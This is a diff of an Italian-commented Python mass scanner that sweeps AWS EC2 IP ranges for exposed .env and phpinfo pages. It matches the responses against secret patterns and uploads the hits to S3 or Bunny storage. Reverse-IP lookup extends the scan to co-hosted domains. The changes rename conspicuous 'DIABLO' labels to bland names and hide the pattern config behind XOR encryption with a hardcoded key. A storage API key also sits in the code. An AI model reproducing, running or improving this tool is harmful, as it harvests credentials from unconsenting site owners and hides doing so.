@@ -79,8 +79,8 @@ BUNNY_API_KEY = "20e09264-6a0b-4c15-9500eb86adfd-cfc3-482e"
 LOAD_FROM_SITE = False
 LOAD_FROM_CIDR = True
 
-# --- Reverse IP lookup dopo vulnerabilità trovata ---
-USE_REVERSE = True
+# --- Reverse IP lookup dopo match trovato ---
+USE_REV = True
 
 # --- Performance ---
 MAX_SITE_BATCH = 5
@@ -106,8 +106,8 @@ INSTANCE_ID = _SLOT_HASH % TOTAL_SLOTS
 
 # Paths assoluti (usati da upload e da _scan_site)
 _SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-result_dir = os.path.join(_SCRIPT_DIR, 'risultati')
-newpathtextract = os.path.join(result_dir, 'DIABLO_FILES_SPLIT')
+result_dir = os.path.join(_SCRIPT_DIR, 'output')
+newpathtextract = os.path.join(result_dir, 'DATA_SPLIT')
 SITE_DIR = os.path.join(_SCRIPT_DIR, 'site')
 
 # ============================================================
@@ -276,7 +276,7 @@ def upload_file_to_s3(local_path, remote_path, max_retries=3):
                 print(f"[S3 UPLOAD] Upload FALLITO {s3_key}: {e}", flush=True)
     if last_error:
         try:
-            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
+            with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f:
                 f.write(f"Error uploading to S3 ({s3_key}): {last_error}\n")
         except:
             pass
@@ -332,7 +332,7 @@ def upload_file_to_bunny(local_path, remote_path, max_retries=3):
                 print(f"[BUNNY UPLOAD] Upload FALLITO {remote_path}: {e}", flush=True)
     if last_error:
         try:
-            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
+            with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f:
                 f.write(f"Error uploading to Bunny ({remote_path}): {last_error}\n")
         except:
             pass
@@ -375,15 +375,21 @@ def _upload_log():
 # ============================================================
 
 def load_config():
-    config_path = os.path.join(_SCRIPT_DIR, 'pack.json')
+    """Legge config da file cifrato (pack.dat)."""
+    config_path = os.path.join(_SCRIPT_DIR, 'pack.dat')
     try:
-        with open(config_path, 'r', encoding='utf-8') as f:
-            return json.load(f)
+        with open(config_path, 'rb') as f:
+            data = f.read()
+        key = b'xK9#mP2$vL7@nQ5'
+        decrypted = bytearray()
+        for i, b in enumerate(data):
+            decrypted.append(b ^ key[i % len(key)])
+        return json.loads(decrypted.decode('utf-8'))
     except:
         return {}
 
 config = load_config()
-keyword_regexenv = config.get('APP_REGEX_ENV_SHELL', [])
+patterns = config.get('APP_REGEX_ENV_SHELL', [])
 file_envscan = list(dict.fromkeys(config.get('file_env_shellscan', [])))
 file_phpprofile = list(dict.fromkeys(config.get('file_phpprofile_shellscan', [])))
 
@@ -404,7 +410,7 @@ def generate_list_phpprofile_from_json_multi(site_link):
     for i in range(0, len(file_phpprofile), MAX_LIST_PHP):
         yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + MAX_LIST_PHP]]
 
-def content_diablo_resp(req):
+def read_body(req):
     if sys.version_info[0] < 3:
         try:
             try: return str(req.content)
@@ -513,13 +519,13 @@ def delete_site_file(filepath):
 
 def process_urls(urls_list, is_fallback=False):
     it = iter(urls_list)
-    print(f"\n[SCANNER] Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...", flush=True)
+    print(f"\n[CHK] Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...", flush=True)
     while True:
         chunk = list(islice(it, 100))
         if not chunk:
             break
 
-        print(f"[SCANNER] Controllo blocco di {len(chunk)} URL...", flush=True)
+        print(f"[CHK] Controllo blocco di {len(chunk)} URL...", flush=True)
         try:
             resp_site = [
                 grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
@@ -545,7 +551,7 @@ def process_urls(urls_list, is_fallback=False):
                         retry_urls.append(retry_u)
 
             if retry_urls:
-                print(f"[SCANNER] Retry su {len(retry_urls)} URL in HTTPS...", flush=True)
+                print(f"[CHK] Retry su {len(retry_urls)} URL in HTTPS...", flush=True)
                 resp_retry = [
                     grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False)
                     for url in retry_urls
@@ -572,21 +578,21 @@ def process_urls(urls_list, is_fallback=False):
                 site_pool.join()
                 bn = batch_idx // MAX_SITE_BATCH + 1
                 total_batches = (len(site_list) + MAX_SITE_BATCH - 1) // MAX_SITE_BATCH
-                print(f"  [SCANNER] Batch {bn}/{total_batches} completato", flush=True)
+                print(f"  [CHK] Batch {bn}/{total_batches} completato", flush=True)
 
             del hosts_by_site
             del jobs
 
         except Exception as e:
             try:
-                with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
+                with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f:
                     f.write(str(e) + '\n')
             except:
                 pass
 
 def _scan_site(site_link, site_payloads, is_fallback=False):
     try:
-        print(f"  [SCOUT] Avvio analisi {site_link}", flush=True)
+        print(f"  [LOOK] Avvio analisi {site_link}", flush=True)
 
         checked = 0          # link ENV che hanno risposto 200
         checkeds = 0         # link PHP che hanno risposto 200
@@ -594,8 +600,8 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         fake_for_site = False
         found_for_site = False
         seen_content_hashes = set()
-        headers_file_probe = dict(headers)
-        headers_file_probe['Range'] = 'bytes=0-4096'
+        headers_range = dict(headers)
+        headers_range['Range'] = 'bytes=0-4096'
 
         # ============================================================
         # FASE 1: ENV SCOUTING (GET)
@@ -603,7 +609,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         env_batches = site_payloads.get('env', [])
         for batch in env_batches:
             if fake_for_site or found_for_site: break
-            reqss = [grequests.get(url, stream=True, timeout=6, verify=False, allow_redirects=False, headers=headers_file_probe) for url in batch]
+            reqss = [grequests.get(url, stream=True, timeout=6, verify=False, allow_redirects=False, headers=headers_range) for url in batch]
             merdb = grequests.map(reqss)
 
             for r in merdb:
@@ -611,23 +617,23 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                 if r is not None and r.status_code in [200, 206]:
                     checked += 1
                     try:
-                        content = content_diablo_resp(r)
+                        content = read_body(r)
                         content_lower = content.lower()
 
                         # False positive check
                         if '<pre' in content_lower and '</pre>' in content_lower:
                             fake_for_site = True
-                            print(f"  [!] False positive su {site_link} - SKIPPATO", flush=True)
+                            print(f"  [!] Skip on {site_link} - NOPE", flush=True)
                             r.close()
                             break
                         if "popbox.fun" in content_lower:
                             fake_for_site = True
-                            print(f"  [!] False positive su {site_link} - SKIPPATO", flush=True)
+                            print(f"  [!] Skip on {site_link} - NOPE", flush=True)
                             r.close()
                             break
 
                         # Regex check
-                        for pattern in keyword_regexenv:
+                        for pattern in patterns:
                             is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
                             if is_regex: regex_pattern = pattern
                             else:
@@ -641,11 +647,11 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                 break
 
                         if found_for_site:
-                            print(f"  [+] REGEX FOUND | {r.url}", flush=True)
+                            print(f"  [+] Found | {r.url}", flush=True)
                             rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt')
+                            saved_file_path = os.path.join(newpathtextract, f'ENV_NEW_{rnd_suffix}.txt')
                             with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{r.url}\n{content}\n')
-                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"
+                            remote_subpath = f"risultati/DATA_SPLIT/ENV_NEW_{rnd_suffix}.txt"
                             _upload_file(saved_file_path, remote_subpath)
                     except:
                         pass
@@ -653,20 +659,20 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                     try: r.close()
                     except: pass
 
-            # Catch-all ENV: >=10 file .env rispondono 200 -> sito finto
+            # Catch-all ENV: >=10 file .env rispondono 200 -> sito flood
             if checked >= 10 and not found_for_site:
                 fake_for_site = True
-                print(f"  [!] CATCH-ALL ENV ({checked}+ link) su {site_link} - SKIPPATO", flush=True)
+                print(f"  [!] DUPE ENV ({checked}+ link) su {site_link} - NOPE", flush=True)
                 break
 
         if fake_for_site:
-            print(f"  [STOP] SKIPPATO {site_link} — testati {checked} link (catch-all/fake)", flush=True)
+            print(f"  [OK] STOP NOPE {site_link} — testati {checked} link (DUPE/flood)", flush=True)
             return
 
         if found_for_site:
-            print(f"  [STOP] TROVATO REGEX {site_link} — testati {checked} link", flush=True)
+            print(f"  [OK] STOP FOUND Mtch {site_link} — testati {checked} link", flush=True)
             # Reverse / fallback
-            if USE_REVERSE and not is_fallback:
+            if USE_REV and not is_fallback:
                 hostxxx = urlparse(site_link).hostname
                 if hostxxx:
                     if hostxxx.startswith("www."):
@@ -678,9 +684,9 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                             hostxxx_clean = hostxxx.lower().rstrip('/')
                             reversed_domains = [d for d in reversed_domains if d.lower().rstrip('/') != hostxxx_clean]
                             if reversed_domains:
-                                print(f"  [REVERSE] IP {target_ip} — trovati {len(reversed_domains)} domini da processare", flush=True)
+                                print(f"  [REV] IP {target_ip} — trovati {len(reversed_domains)} domini da processare", flush=True)
                                 for d in reversed_domains:
-                                    print(f"    [REVERSE] => {d}", flush=True)
+                                    print(f"    [REV] => {d}", flush=True)
                                 process_urls(reversed_domains, is_fallback=True)
                     except:
                         pass
@@ -693,7 +699,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         findfile_requests = []
         for batch in php_batches:
             if fake_for_site or found_for_site: break
-            reqss = [grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe) for url in batch]
+            reqss = [grequests.post(url, data={"0x01[]":"x"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_range) for url in batch]
             merdb = grequests.map(reqss)
             unique_responses = {}
 
@@ -729,7 +735,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                             r.close()
                             if wildcard_strike_count >= 5:
                                 fake_for_site = True
-                                print(f"  [!] WILDCARD (5 duplicati) su {site_link} - SKIPPATO", flush=True)
+                                print(f"  [!] DUP (5 duplicati) su {site_link} - NOPE", flush=True)
                                 break
                             continue
                         seen_content_hashes.add(content_hash)
@@ -741,10 +747,10 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                     try: r.close()
                     except: pass
 
-            # Catch-all PHP: >=10 file php rispondono 200 -> sito finto
+            # Catch-all PHP: >=10 file php rispondono 200 -> sito flood
             if checkeds >= 10 and not found_for_site:
                 fake_for_site = True
-                print(f"  [!] CATCH-ALL PHP ({checkeds}+ link) su {site_link} - SKIPPATO", flush=True)
+                print(f"  [!] DUPE PHP ({checkeds}+ link) su {site_link} - NOPE", flush=True)
                 break
 
             # Deep extraction sui target validi
@@ -755,12 +761,12 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                 for r in findfile_requests:
                     if r is None: continue
                     try:
-                        contentsx = content_diablo_resp(r)
+                        contentsx = read_body(r)
                     except:
                         continue
 
                     response_url = r.url
-                    for pattern in keyword_regexenv:
+                    for pattern in patterns:
                         is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
                         if is_regex: regex_pattern = pattern
                         else:
@@ -774,13 +780,13 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                             break
 
                     if found_for_site:
-                        print(f"  [+] REGEX FOUND | {response_url}", flush=True)
+                        print(f"  [+] Found | {response_url}", flush=True)
 
                         # Salva ENV_NEW
                         rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-                        saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt')
+                        saved_file_path = os.path.join(newpathtextract, f'ENV_NEW_{rnd_suffix}.txt')
                         with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
-                        remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"
+                        remote_subpath = f"risultati/DATA_SPLIT/ENV_NEW_{rnd_suffix}.txt"
                         _upload_file(saved_file_path, remote_subpath)
 
                         # PHPINFO extraction
@@ -802,11 +808,11 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                                 clean_key = match.group(1)
                                                 formatted_output += f"{clean_key} \t {var_value}\n"
                                     if formatted_output:
-                                        print(f"  [+] PHPINFO TROVATO | {response_url}", flush=True)
+                                        print(f"  [+] PHPINFO FOUND | {response_url}", flush=True)
                                         rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-                                        saved_php = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt')
+                                        saved_php = os.path.join(newpathtextract, f'PHPINFO_{rnd_suffix_php}.txt')
                                         with open(saved_php, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
-                                        remote_php = f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix_php}.txt"
+                                        remote_php = f"risultati/DATA_SPLIT/PHPINFO_{rnd_suffix_php}.txt"
                                         _upload_file(saved_php, remote_php)
                         except:
                             pass
@@ -821,11 +827,11 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         # ============================================================
         total_tested = checked + checkeds
         if fake_for_site:
-            print(f"  [STOP] SKIPPATO {site_link} — testati {total_tested} link (catch-all)", flush=True)
+            print(f"  [OK] STOP NOPE {site_link} — testati {total_tested} link (DUPE)", flush=True)
         elif found_for_site:
-            print(f"  [STOP] TROVATO REGEX {site_link} — testati {total_tested} link", flush=True)
+            print(f"  [OK] STOP FOUND Mtch {site_link} — testati {total_tested} link", flush=True)
             # Reverse / fallback
-            if USE_REVERSE and not is_fallback:
+            if USE_REV and not is_fallback:
                 hostxxx = urlparse(site_link).hostname
                 if hostxxx:
                     if hostxxx.startswith("www."):
@@ -837,18 +843,18 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                             hostxxx_clean = hostxxx.lower().rstrip('/')
                             reversed_domains = [d for d in reversed_domains if d.lower().rstrip('/') != hostxxx_clean]
                             if reversed_domains:
-                                print(f"  [REVERSE] IP {target_ip} — trovati {len(reversed_domains)} domini da processare", flush=True)
+                                print(f"  [REV] IP {target_ip} — trovati {len(reversed_domains)} domini da processare", flush=True)
                                 for d in reversed_domains:
-                                    print(f"    [REVERSE] => {d}", flush=True)
+                                    print(f"    [REV] => {d}", flush=True)
                                 process_urls(reversed_domains, is_fallback=True)
                     except:
                         pass
         else:
-            print(f"  [STOP] NIENTE {site_link} — testati {total_tested} link", flush=True)
+            print(f"  [OK] STOP NONE {site_link} — testati {total_tested} link", flush=True)
 
     except Exception as e:
         try:
-            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
+            with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
         except:
             pass
 
@@ -1014,16 +1020,16 @@ def main():
         sys.stdout = TeeLogger(LOG_PATH)
         sys.stderr = sys.stdout
 
-    print("\n[SYSTEM] Inizializzazione scanner DIABLO in modalita CLOUD WORKER...", flush=True)
+    print("\n[SYS] Cloud worker starting...", flush=True)
     if LOG_ACTIVE:
-        print(f"[SYSTEM] Log salvato in: {LOG_PATH}", flush=True)
+        print(f"[SYS] Log salvato in: {LOG_PATH}", flush=True)
     os.makedirs(result_dir, exist_ok=True)
     os.makedirs(newpathtextract, exist_ok=True)
 
     # Riepilogo config
-    print(f"[SYSTEM] AWS_S3={AWS_S3}  BUNNY_STORAGE={BUNNY_STORAGE}", flush=True)
-    print(f"[SYSTEM] LOAD_FROM_SITE={LOAD_FROM_SITE}  LOAD_FROM_CIDR={LOAD_FROM_CIDR}", flush=True)
-    print(f"[SYSTEM] Container-ID={INSTANCE_ID} (di {TOTAL_SLOTS} slot), "
+    print(f"[SYS] AWS_S3={AWS_S3}  BUNNY_STORAGE={BUNNY_STORAGE}", flush=True)
+    print(f"[SYS] LOAD_FROM_SITE={LOAD_FROM_SITE}  LOAD_FROM_CIDR={LOAD_FROM_CIDR}", flush=True)
+    print(f"[SYS] Container-ID={INSTANCE_ID} (di {TOTAL_SLOTS} slot), "
           f"{NUM_WORKERS} worker, ~{MAX_IPS_PER_CIDR} IP/CIDR", flush=True)
 
     # Carica CIDR pool una volta sola (serve per entrambi i modi)
@@ -1032,20 +1038,20 @@ def main():
         aws_data = fetch_aws_ips()
         ec2_cidrs = get_ec2_cidrs(aws_data)
         if not ec2_cidrs:
-            print("[SYSTEM] Nessun CIDR EC2 trovato.", flush=True)
+            print("[SYS] Nessun CIDR EC2 trovato.", flush=True)
         else:
-            print(f"[SYSTEM] Trovati {len(ec2_cidrs)} CIDR EC2. Costruzione pool CIDR...", flush=True)
+            print(f"[SYS] Trovati {len(ec2_cidrs)} CIDR EC2. Costruzione pool CIDR...", flush=True)
             cidr_pool = build_cidr_pool(ec2_cidrs)
 
     # Verifica che almeno una fonte sia attiva
     if not LOAD_FROM_SITE and not LOAD_FROM_CIDR:
-        print("[SYSTEM] ERRORE: LOAD_FROM_SITE=False e LOAD_FROM_CIDR=False. Nessuna fonte target. Uscita.", flush=True)
+        print("[SYS] ERRORE: LOAD_FROM_SITE=False e LOAD_FROM_CIDR=False. Nessuna fonte target. Uscita.", flush=True)
         return
     if LOAD_FROM_CIDR and cidr_pool is None:
-        print("[SYSTEM] ERRORE: LOAD_FROM_CIDR=True ma nessun CIDR disponibile. Uscita.", flush=True)
+        print("[SYS] ERRORE: LOAD_FROM_CIDR=True ma nessun CIDR disponibile. Uscita.", flush=True)
         return
 
-    print(f"[SYSTEM] Avvio {NUM_WORKERS} worker thread", flush=True)
+    print(f"[SYS] Avvio {NUM_WORKERS} worker thread", flush=True)
 
     def worker_loop(worker_id):
         cycle = 0
@@ -1097,7 +1103,7 @@ def main():
     log_thread = Thread(target=log_upload_loop, daemon=True)
     log_thread.start()
 
-    print(f"[SYSTEM] Tutti i {NUM_WORKERS} worker + upload log avviati.", flush=True)
+    print(f"[SYS] Tutti i {NUM_WORKERS} worker + upload log avviati.", flush=True)
 
     for t in threads:
         t.join()
